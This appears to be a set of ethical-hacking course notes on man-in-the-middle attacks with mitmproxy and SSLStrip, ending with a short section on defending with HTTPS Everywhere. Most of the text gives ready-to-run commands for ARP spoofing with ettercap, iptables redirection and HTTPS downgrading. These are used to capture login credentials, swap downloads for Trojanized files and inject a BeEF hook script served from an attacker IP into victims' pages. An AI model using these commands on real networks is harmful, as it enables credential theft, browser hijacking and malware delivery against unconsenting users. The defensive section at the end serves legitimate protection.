# 🧠 **Using mitmproxy SSLStrip Script (Bypassing HTTPS Encryption)**

## 🎯 **Objective**

Learn how to use a **mitmproxy SSLStrip script** to downgrade HTTPS traffic (encrypted) to HTTP (plain text) — allowing you to **read and modify secure connections**.

---

## ⚙️ **Problem Overview**

* Modern websites mostly use **HTTPS (SSL/TLS encryption)**.
* Normal MITM attacks and mitmproxy modifications **don’t work** on HTTPS because:

  * The data is **encrypted**.
  * You **can’t read or modify** traffic contents.

---

## ❌ **Limitation**

* Tools like **SSLStrip** can downgrade HTTPS → HTTP.
* But **both SSLStrip and mitmproxy** are **transparent proxies**,
  so they **cannot run simultaneously**.

---

## ✅ **Solution**

Use a **mitmproxy SSLStrip script** that:

* Behaves like the old `sslstrip` tool,
* But is **fully integrated into mitmproxy**,
* Allowing you to:

  * Downgrade HTTPS to HTTP
  * Analyze and modify traffic
  * Run with other mitmproxy scripts (like file replacement or injection)

---

## 📂 **Script Source**

Official mitmproxy example:
🔗 [https://github.com/mitmproxy/mitmproxy/blob/v2.0.2/examples/complex/sslstrip.py](https://github.com/mitmproxy/mitmproxy/blob/v2.0.2/examples/complex/sslstrip.py)

---

## 🧩 **Setup Steps**

### 1. **Get the Script**

* Copy all contents of the `sslstrip.py` from GitHub.
* Open **Geany** or any text editor.
* Paste the code.
* Save as:

  ```bash
  /opt/mitmproxy/sslstrip.py
  ```

---

### 2. **Run mitmproxy with SSLStrip Script**

```bash
sudo mitmdump -s /opt/mitmproxy/sslstrip.py --transparent
```

This runs mitmproxy in transparent mode with the SSLStrip downgrade enabled.

---

### 3. **Start ARP Spoofing (Become MITM)**

```bash
sudo ettercap -T -q -M arp:remote -S /<target_IP>// /<gateway_IP>//
```

---

### 4. **Redirect Traffic to mitmproxy**

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

---

### 5. **Test on Target Machine**

1. Open browser on target machine.
2. Visit a secure site (e.g., `https://hotmail.com`).
3. It will be downgraded to `http://hotmail.com`.
4. When credentials are entered, they’ll appear **in mitmproxy logs**.

---

## 🧪 **Expected Output**

You’ll see credentials like:

```
Username: user@hotmail.com
Password: 123456
```

✅ HTTPS downgraded successfully
✅ Data intercepted and readable

# 🧠 **Replacing Downloads on HTTPS Websites Using mitmproxy + SSLStrip**

## 🎯 **Objective**

Use mitmproxy to intercept and replace downloads on **HTTPS (SSL)** websites by **combining two scripts**:

1. `sslstrip.py` → Downgrades HTTPS to HTTP
2. Your custom replacement script → Replaces file downloads with Trojanized versions

This combination allows **file replacement attacks to work even on secure (HTTPS) websites**.

---

## ⚙️ **The Problem**

* mitmproxy alone can only intercept **HTTP (unencrypted)** traffic.
* On HTTPS, data is **encrypted**, so:

  * You can’t view, intercept, or modify packets.
  * File replacement or injection **won’t work**.

---

## ✅ **The Solution**

Combine two mitmproxy scripts:

1. **SSLStrip script** – Converts HTTPS → HTTP (acts like `sslstrip`).
2. **Your custom script** – Detects downloads (`.exe`, `.pdf`, `.zip`, etc.) and replaces them with your payload.

This makes **any HTTP or HTTPS site vulnerable to your modification** during a man-in-the-middle session.

---

## 🧩 **Setup Steps**

### 1. Start ARP Spoofing (Become the MITM)

Redirect the target’s traffic through your machine:

```bash
sudo ettercap -T -q -S -M arp:remote /<target_IP>// /<gateway_IP>//
```

---

### 2. Run mitmproxy with Both Scripts

Use multiple `-s` arguments to load both scripts together:

```bash
sudo mitmdump -s /opt/mitmproxy/sslstrip.py -s /root/basic.py --transparent
```

**Explanation:**

* `sslstrip.py` → Downgrades HTTPS traffic to HTTP
* `basic.py` → Your custom file-replacement script
* `--transparent` → Makes mitmproxy act as a silent MITM proxy

---

### 3. Redirect HTTP Traffic to mitmproxy

If not already done:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

---

### 4. Verify HTTPS Downgrade

1. On victim’s machine, visit a secure site like:

   ```
   https://rarlab.com
   ```
2. It should now **load as HTTP**:

   ```
   http://rarlab.com
   ```
3. All links will appear **unencrypted**, visible in mitmproxy logs.

---

### 5. Test File Replacement

1. Download any `.exe`, `.pdf`, `.zip`, etc. file from that site.
2. Instead of the original file, the browser will download your **Trojanized file** — for example:

   ```
   file.exe or file.pdf (infected version)
   ```
3. The file name, icon, and extension look normal, but it includes your payload.

---

## 🧠 **How It Works**

* `sslstrip.py`:

  * Rewrites HTTPS links in HTML to HTTP.
  * Downgrades secure traffic → plaintext.
* `basic.py` (your script):

  * Monitors requests for specific extensions.
  * Generates a malicious version using your payload.
  * Returns a 301 redirect to your malicious file.

**Together:**
They bypass HTTPS encryption and inject modified files seamlessly.

# 🧠 **Injecting Code into HTTPS Web Pages Using mitmproxy + SSLStrip**

## 🎯 **Objective**

Use **mitmproxy** with **SSLStrip** to downgrade HTTPS connections → HTTP,
allowing you to **inject JavaScript or HTML code** (like a BeEF hook or alert) into encrypted pages.

---

## ⚙️ **Problem**

* HTTPS (SSL/TLS) encrypts all page content.
* mitmproxy cannot read or modify encrypted HTTPS traffic.
* Therefore, **injection attacks (e.g., adding scripts or replacing body content)** fail on HTTPS sites.

---

## ✅ **Solution: SSLStrip + Replace Argument**

By using the `sslstrip.py` script, you can **downgrade HTTPS → HTTP**.
Then, use mitmproxy’s **replace** argument to modify the HTML body and inject your own code.

---

## 🧩 **Setup Steps**

### 1. Run ARP Spoofing (Become MITM)

Redirect target traffic through your computer:

```bash
sudo ettercap -T -q -S -M arp:remote /<target_IP>// /<gateway_IP>//
```

---

### 2. Run mitmproxy with SSLStrip + Replace Command

You can use both downgrade and injection features in one line:

```bash
sudo mitmdump -s /opt/mitmproxy/sslstrip.py --transparent \
--replace "/</body>/ <script src='http://<attacker_ip>:3000/hook.js'></script></body>"
```

**Explanation:**

* `sslstrip.py`: Downgrades HTTPS to HTTP.
* `--mode transparent`: Acts as a passive MITM proxy.
* `--replace`: Replaces the closing `</body>` tag with injected JavaScript.

  * In this example, it inserts the **BeEF hook script** before the `</body>` tag.

---

### 3. Verify Injection

1. Victim visits an HTTPS site (e.g. `https://hotmail.com`).
2. SSLStrip downgrades it → HTTP.
3. mitmproxy injects your JavaScript (`hook.js`).
4. On the attacker’s BeEF panel, the victim browser appears as “Online”.

---

### 4. Test the Hook

In the BeEF control panel:

* Select the victim browser.
* Run a simple command (e.g., `alert('BeEF is working!')`).
* You’ll see the alert pop up on the victim’s browser — confirming successful injection.

---

## 🧠 **How It Works**

1. **SSLStrip script**:

   * Converts HTTPS → HTTP by rewriting links.
   * Allows plaintext interception.
2. **mitmproxy Replace Argument**:

   * Scans HTML content for `</body>`.
   * Inserts your malicious script before it.
3. **Result**:

   * Secure pages become editable.
   * Injected code executes on victim’s browser.

---

## ⚠️ **Limitations**

* **HSTS (HTTP Strict Transport Security)** websites (e.g., Google, Facebook, Twitter)
  cannot be downgraded. Browsers refuse to load them over HTTP.
* Works on most **non-HSTS** HTTPS sites.

---

## 💡 **Pro Tip**

* Always test first with a simple `alert("test")` injection.
* Once it works, replace it with your BeEF hook or custom script.
* Combine this with your **Trojan Factory script** to deliver payloads automatically.

# 🧠 **Protection Against Man-in-the-Middle & ARP Spoofing Attacks**

## 🎯 **Objective**

Learn how to **secure your computer and browser** from man-in-the-middle (MITM) attacks that downgrade HTTPS to HTTP (like with SSLStrip).

---

## ⚠️ **Problem**

* Attackers can intercept your network traffic using ARP spoofing.
* Tools like **SSLStrip** downgrade HTTPS → HTTP, making your traffic readable.
* Detection tools (e.g., XARP) **alert you** but **don’t protect you**.

---

## ✅ **Solution: HTTPS Everywhere**

[**HTTPS Everywhere:**](https.en.softonic.com)
**HTTPS Everywhere** is a browser extension that forces websites to load only over **HTTPS (SSL/TLS)** — even if you manually type `http://`.

### 🔹 **Supported Browsers**

* Google Chrome
* Mozilla Firefox

### 🔹 **What It Does**

* Automatically redirects all requests to the HTTPS version of the site.
* Prevents attackers from downgrading your connection to HTTP.
* Ensures all data (passwords, forms, etc.) stay encrypted.

---

## 🧩 **Installation Steps (Example: Firefox)**

1. Go to Google and search:

   ```
   HTTPS Everywhere Firefox
   ```
2. Click on the official result (from EFF.org).
3. Click **“Add to Firefox” → “Add Extension”**.
4. You’ll see a **blue HTTPS icon** appear in the top-right corner.
5. Enable it by ticking ✅ **“Enable HTTPS Everywhere”**.

---

## 🧪 **Testing the Protection**

### 1️⃣ **Without HTTPS Everywhere**

* Hacker runs ARP spoofing + SSLStrip.
* Victim visits `https://hotmail.com`.
* Browser loads **HTTP version**.
* Username and password are captured by the attacker.

### 2️⃣ **With HTTPS Everywhere Enabled**

* Victim visits the same site.
* Browser **forces HTTPS**.
* Data stays encrypted — attacker sees only unreadable packets.
* Even HTTP-only sites (like `bing.com`) load over HTTPS if possible.

---

## 🔍 **Network Verification (Wireshark Example)**

When HTTPS Everywhere is active:

* All packets appear as encrypted (`TLSv1.3`, `SSL`).
* No visible URLs, usernames, or passwords.
* Hacker remains “in the middle” but sees **no useful data**.

---

## ⚙️ **Key Notes**

| Concept              | Description                             |
| -------------------- | --------------------------------------- |
| **ARP Spoofing**     | Redirects traffic through attacker’s PC |
| **SSLStrip**         | Downgrades HTTPS → HTTP                 |
| **HTTPS Everywhere** | Prevents SSLStrip downgrade             |
| **Result**           | Data encrypted, MITM attack useless     |

---

## 🔐 **Limitations**

* Doesn’t stop the attacker from becoming MITM.
  (They still intercept traffic, but it’s encrypted.)
* Protects **your data confidentiality**, not network integrity.
